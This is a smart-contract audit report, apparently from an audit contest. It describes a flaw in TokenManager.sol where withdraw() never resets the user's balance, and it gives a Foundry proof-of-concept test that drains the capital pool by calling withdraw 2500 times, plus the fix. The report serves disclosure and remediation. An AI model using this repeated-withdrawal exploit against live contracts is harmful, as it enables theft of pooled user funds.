## Vulnerability Details 🔍 && Impact 📈

At `TokenManager.sol` contract, the `withdraw()` function does not delete the state responsible for the funds accounting. Thus users can simply call it multiple times and withdraw value that is not theirs.

---

## Proof Of Concept (PoC) 👨‍💻💻

> 🚧 **Note** ⚠️ The code has another issue, doesnt approve to `CapitalPool` before transfer with tokens different than WETH, so withdraw always reverts, once that fixed, run this poc and see that this issue also exists and has different root source. To fix it add this line: `ICapitalPool(capitalPoolAddr).approve(_tokenAddress);`, [here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/TokenManager.sol#L173). I've sent that report separately, this report is not about this issue please do not include this issue as a duplicate of that one, this issue is about drainning the pool due to bad accounting.

Paste this test in the `PreMarkets.t.sol` file, import `import "forge-std/console.sol";`, and run `forge test --mt "test_stealFundsWithdraw"`:

<details> <summary> See test code 👁️ </summary>

```solidiy
    function test_stealFundsWithdraw() public {
        console.log("Simulate people trading and using the system, thus capital pool already holds some funds.");
        deal(address(mockUSDCToken), address(capitalPool), 100_000_000 * 10 ** 18);
        uint256 balanceOfCapitalPool = mockUSDCToken.balanceOf(address(capitalPool));
        console.log("balanceOfCapitalPool:  ", balanceOfCapitalPool);

        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace, address(mockUSDCToken), 1000, 0.01 * 1e18, 12000, 300, OfferType.Ask, OfferSettleType.Turbo
            )
        );

        balanceOfCapitalPool = mockUSDCToken.balanceOf(address(capitalPool));
        console.log("After ask maker:");
        console.log("balanceOfCapitalPool:  ", balanceOfCapitalPool);
        vm.stopPrank();

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        vm.prank(user2);
        preMarktes.createTaker(offerAddr, 500);
        console.log("Now some taker has taken the offer and payed the ask maker.");
        console.log("After ask maker and bid taker:");
        console.log("balanceOfCapitalPool:  ", balanceOfCapitalPool);
        uint256 makerBalance =
            tokenManager.userTokenBalanceMap(address(user), address(mockUSDCToken), TokenBalanceType.TaxIncome);
        console.log("Balance on TokenManager contract of ask maker user: ", makerBalance);
        vm.startPrank(user);
        console.log("Maker calls withdraw.");
        uint256 numOfWithdrawals = 2500;
        for(uint256 i = 0; i< numOfWithdrawals; i++){
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome);
        }
        balanceOfCapitalPool = mockUSDCToken.balanceOf(address(capitalPool));
        console.log("After,", numOfWithdrawals, " withdrawals:");
        console.log("balanceOfCapitalPool:  ", balanceOfCapitalPool);
        console.log("The user is clearly withdrawing more.");
    }
```

</details>

---

## Recommendations 🎯

Reset the value on the mapping each time a user withdraws their funds like so:

```solidity
delete userTokenBalanceMap[_msgSender()][
    _tokenAddress
][_tokenBalanceType];
```

It is better to do it after the functions' cheks to follow the safety standanrd of check effects interactions. Should be around [here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/TokenManager.sol#L148).

---